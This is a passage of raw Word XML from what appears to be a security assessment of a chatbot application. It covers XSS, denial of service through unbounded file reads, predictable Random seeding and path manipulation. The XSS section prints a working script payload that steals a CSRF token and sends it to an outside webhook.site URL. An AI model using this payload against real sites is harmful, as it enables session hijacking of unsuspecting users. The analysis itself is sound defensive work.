      <w:r w:rsidRPr="005432B6">
        <w:lastRenderedPageBreak/>
        <w:t>Cross-Site Scripting: Self</w:t>
      </w:r>
      <w:bookmarkEnd w:id="58"/>
    </w:p>
    <w:p w14:paraId="6A0579A5" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>This vulnerability allows an attacker to change the bot’s message and then send a URL to an unsuspecting user. In reality, the attacker writes in the JSON of the bot an HTML &lt;script&gt; tag with some exploit code (as the example under):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1753898E" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="4E46F641">
      <w:pPr>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>&lt;script&gt;fetch('http://localhost:7070/auth/csrf-token').then(r=&gt;r.json()</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>).then</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(d=&gt;fetch('https://webhook.site/e7e6a5e3-bc27-464f-910c-51d12de03d3c?csrf='+d.csrfToken))&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B1F8B0A" w14:textId="361E01F1" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>And so, as soon as the victim visits the link to the affected bot, the malicious JavaScript code runs in his/her browser. The first fetch to http://localhost:7070/auth/csrf-token fetches a new CSRF token for the user’s session, and then the second fetch sends this new token immediately to a website in the hand of the attacker. As a result, the attacker can get a unique token identifying the victim (</w:t>
      </w:r>
      <w:r w:rsidR="003A2011">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="003A2011">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref199858881 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="003A2011">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:r>
      <w:r w:rsidR="003A2011">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00257ECB" w:rsidRPr="003A2011">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="003A2011">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>), to conduct perhaps a “play on his behalf”. Since it is injected directly into the answers from the bot and executed in the context of the user’s security, it is an example of XSS in which unaware customers are induced to perform unauthorized operations while being convinced to interact with an honest interface.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F88BEDB" w14:textId="77777777" w:rsidR="003A2011" w:rsidRDefault="001A39A9" w:rsidP="003A2011">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="114300" distB="114300" distL="114300" distR="114300" wp14:anchorId="5810E493" wp14:editId="07777777">
            <wp:extent cx="5217111" cy="3527183"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1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1"/>
                    <a:srcRect/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5217111" cy="3527183"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln/>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FD48F05" w14:textId="54A0439D" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="003A2011">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="59" w:name="_Ref199858881"/>
      <w:r w:rsidRPr="003A2011">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidRPr="003A2011">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00AD7B7C">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="59"/>
      <w:r w:rsidR="001A39A9" w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">: Intercepted request to steal </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="001A39A9" w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>crsf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="001A39A9" w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> token</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3483D40E" w14:textId="77777777" w:rsidR="003A2011" w:rsidRPr="005432B6" w:rsidRDefault="003A2011">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="515175BC" w14:textId="2152F244" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="60" w:name="_Toc200039290"/>
      <w:r w:rsidRPr="005432B6">
        <w:lastRenderedPageBreak/>
        <w:t>Dead Code: Expression is Always true</w:t>
      </w:r>
      <w:bookmarkEnd w:id="60"/>
    </w:p>
    <w:p w14:paraId="488A6C22" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">No exploitation is possible because it isn’t a vulnerability issue. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="646511D2" w14:textId="342E7CF0" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="61" w:name="_Toc200039291"/>
      <w:r w:rsidRPr="005432B6">
        <w:t>Denial of Service</w:t>
      </w:r>
      <w:bookmarkEnd w:id="61"/>
    </w:p>
    <w:p w14:paraId="47E7D655" w14:textId="51A36C63" w:rsidR="00C639D5" w:rsidRPr="00C639D5" w:rsidRDefault="00C639D5" w:rsidP="00C639D5">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C639D5">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>This vulnerability in the file management system may be exploited by an attacker to compromise the system's stability relatively easily. Without controls on file size or line length, the system attempts to load all read data into memory without restriction.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0912F921" w14:textId="280FD9F3" w:rsidR="00C639D5" w:rsidRPr="00C639D5" w:rsidRDefault="00C639D5" w:rsidP="00C639D5">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C639D5">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>For example, a user can load a large file via a feature designed for this purpose, such as importing or loading files. Alternatively, they can provide a file containing one very long line designed without breaks to exploit the read method, which reads one entire line at a time.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78EDEB52" w14:textId="45BAC0D5" w:rsidR="00C639D5" w:rsidRPr="00C639D5" w:rsidRDefault="00C639D5" w:rsidP="00C639D5">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C639D5">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">In both cases, the system reads the entire contents regardless of how much memory space they occupy, which can quickly lead to high RAM usage. Once the memory is full, the system produces a critical error, such as an </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C639D5">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>OutOfMemoryError</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C639D5">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>, which can crash the application completely, rendering the service unavailable to all users.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="738610EB" w14:textId="303DFEFE" w:rsidR="00910649" w:rsidRPr="009F110F" w:rsidRDefault="00C639D5">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C639D5">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>This problem is particularly severe if such features are publicised, since no particular access or authentication is required to trigger the erroneous behaviour. The flaw is exploited by sending a specially designed file.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CEAF13A" w14:textId="667CA61C" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="62" w:name="_Toc200039292"/>
      <w:r w:rsidRPr="005432B6">
        <w:t>Denial of Service: StringBuilder</w:t>
      </w:r>
      <w:bookmarkEnd w:id="62"/>
    </w:p>
    <w:p w14:paraId="29016BD6" w14:textId="0C0F75F9" w:rsidR="009F110F" w:rsidRPr="009F110F" w:rsidRDefault="009F110F" w:rsidP="009F110F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009F110F">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>Without limits on row and total file length, an attacker could load a very large text file (hundreds of megabytes or more). This would have caused the method to read and add all the rows to an initialised StringBuilder with a default capacity, resulting in exponential memory usage. This would quickly cause the JVM to run out of heap space, resulting in the application crashing or the service hanging.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="382D8AE8" w14:textId="609F1E65" w:rsidR="009F110F" w:rsidRPr="009F110F" w:rsidRDefault="009F110F" w:rsidP="009F110F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009F110F">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>In the real world, an attack would be simple: provide a text file containing one very long line or lots of lines, or modify an input file endpoint in order to consume the server's memory.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="637805D2" w14:textId="7191F23A" w:rsidR="00910649" w:rsidRPr="009F110F" w:rsidRDefault="009F110F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009F110F">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>Apart from a denial-of-service (DoS) attack, without controls and bounds, an attacker could also exploit the feature to load malicious data, which could have side effects elsewhere in the system.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47EE63B5" w14:textId="56FD6D44" w:rsidR="00910649" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="63" w:name="_Toc200039293"/>
      <w:r w:rsidRPr="005432B6">
        <w:t>Insecure Randomness</w:t>
      </w:r>
      <w:bookmarkEnd w:id="63"/>
    </w:p>
    <w:p w14:paraId="1DF97FAF" w14:textId="286EAC22" w:rsidR="00B97E7E" w:rsidRDefault="00B97E7E" w:rsidP="00B97E7E">
      <w:pPr>
        <w:keepNext/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B97E7E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">A flaw is recognized in the use of </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00B97E7E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>java.util</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00B97E7E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>.Random</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B97E7E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> to choose a reply from those available in the bot. As a new </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0011668E">
        <w:rPr>
          <w:b/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Random</w:t>
      </w:r>
      <w:r w:rsidRPr="00B97E7E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00B97E7E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">) is put up for each required random number the seed is by necessity produced out of </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B97E7E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>System.</w:t>
      </w:r>
      <w:r w:rsidRPr="0011668E">
        <w:rPr>
          <w:b/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>currentTimeMillis</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B97E7E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">() (or alike for </w:t>
      </w:r>
      <w:r w:rsidRPr="00B97E7E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">other predictable timestamps). </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00B97E7E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>So</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00B97E7E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> an adversary who can simply see a small number of outputs from the bot can perform a time brute-force: by guessing roughly when the server fired off these numbers they can try all milliseconds at that time to get the same index sequence. In this specific case, after seeing an initial time just at the Random object creation, the “target sequence” of the replies is drawn; then, the attacker tries for all seeds in the same second, finds the seed which produces the same index sequence and this is the original seed. Even if one would try a more sophisticated attack against a </w:t>
      </w:r>
      <w:r w:rsidRPr="009C0892">
        <w:rPr>
          <w:b/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>LCG</w:t>
      </w:r>
      <w:r w:rsidRPr="00B97E7E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (Linear Congruential Generator</w:t>
      </w:r>
      <w:r w:rsidR="003F7C44">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="003F7C44">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>thst</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="003F7C44">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> is case of </w:t>
      </w:r>
      <w:r w:rsidR="003F7C44" w:rsidRPr="0041605A">
        <w:rPr>
          <w:b/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>PRNG</w:t>
      </w:r>
      <w:r w:rsidR="003F7C44" w:rsidRPr="003F7C44">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (Pseudo-Random Number Generator)</w:t>
      </w:r>
      <w:r w:rsidRPr="00B97E7E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">) and try to recover algebraically the internal state after seeing two or more consecutive outputs no success will come from that because Random is anew instantiated each time, so one cannot see two or more draws from the same generator. </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00B97E7E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>So</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00B97E7E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> in the end the problem is the predictable seed: a simple time brute-force will suffice to get the exact same number sequence and hence guess the bot’s replies.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="194298D4" w14:textId="4C2AB89F" w:rsidR="000C41E6" w:rsidRDefault="00125870" w:rsidP="000C41E6">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r w:rsidRPr="00125870">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="40CD5BC4" wp14:editId="7B4BC271">
            <wp:extent cx="3646967" cy="4016550"/>
            <wp:effectExtent l="0" t="0" r="0" b="3175"/>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660658" cy="4031628"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B7B4B86" w14:textId="7EE12D6A" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="000C41E6" w:rsidP="002F76F5">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00AD7B7C">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t>: PRNG smart brute force attack</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55017DF3" w14:textId="1A21BE22" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="64" w:name="_Toc200039294"/>
      <w:r w:rsidRPr="005432B6">
        <w:t>Missing Check against Null</w:t>
      </w:r>
      <w:bookmarkEnd w:id="64"/>
    </w:p>
    <w:p w14:paraId="5630AD66" w14:textId="024BD459" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">No exploitation is possible because it isn’t a vulnerability issue. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="480DA76E" w14:textId="3B172A3C" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="65" w:name="_Toc200039295"/>
      <w:r w:rsidRPr="005432B6">
        <w:lastRenderedPageBreak/>
        <w:t>Password Management: Password in Comment</w:t>
      </w:r>
      <w:bookmarkEnd w:id="65"/>
    </w:p>
    <w:p w14:paraId="1ED0028B" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">No exploitation is possible because it isn’t a vulnerability issue. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31FF2F2F" w14:textId="02BC15E5" w:rsidR="00910649" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="66" w:name="_Toc200039296"/>
      <w:r w:rsidRPr="005432B6">
        <w:t>Path Manipulation</w:t>
      </w:r>
      <w:bookmarkEnd w:id="66"/>
    </w:p>
    <w:p w14:paraId="6A47927C" w14:textId="33132C69" w:rsidR="00882917" w:rsidRDefault="004A4153" w:rsidP="00882917">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>During the static code analysis multiple path manipulation vulnerability was found but only one of these are dangerous (</w:t>
      </w:r>
      <w:r w:rsidR="008633E4">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="008633E4">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref199945769 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="008633E4">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:r>
      <w:r w:rsidR="008633E4">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00257ECB" w:rsidRPr="00257ECB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="008633E4">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>), even if it is so difficult to exploit. An attacker could modify a (</w:t>
      </w:r>
      <w:r w:rsidR="008633E4">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="008633E4">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref199945789 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="008633E4">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:r>
      <w:r w:rsidR="008633E4">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00257ECB" w:rsidRPr="00257ECB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="008633E4">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidR="00A15C3A">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> the path</w:t>
      </w:r>
      <w:r w:rsidR="008F181E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> in the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="008F181E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>bot.json</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="008F181E">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> file and </w:t>
      </w:r>
      <w:r w:rsidR="0034012A">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>perform some action on th</w:t>
      </w:r>
      <w:r w:rsidR="005E29C4">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r w:rsidR="0034012A">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> file system of the server that </w:t>
      </w:r>
      <w:r w:rsidR="005E29C4">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">hosts the application. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77FD1073" w14:textId="71B62BB7" w:rsidR="00B4086D" w:rsidRPr="00B4086D" w:rsidRDefault="00B4086D" w:rsidP="00882917">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B4086D">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>While the security issue outlined in the article is theoretically severe, actually exploiting it is very hard. An attacker should come up with a path for their payload that not only does not trigger any input validation but is also correctly seen by the code that processes it. Usually, the perpetrator should be aware of the directory structure and path</w:t>
      </w:r>
      <w:r w:rsidRPr="00B4086D">
        <w:rPr>
          <w:rFonts w:ascii="Cambria Math" w:hAnsi="Cambria Math" w:cs="Cambria Math"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>‐</w:t>
      </w:r>
      <w:r w:rsidRPr="00B4086D">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">normalization policy of the application. In other words, the bad path should perfectly imitate a correct file or directory begun as it were seen by the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00B4086D">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>bot.json</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00B4086D">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> handling routines. Nevertheless, for an extremely skilled opponent</w:t>
      </w:r>
      <w:r w:rsidR="00086451">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="00B4086D">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>especially one that knows the code of the target</w:t>
      </w:r>
      <w:r w:rsidR="00086451">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="00B4086D">
        <w:rPr>
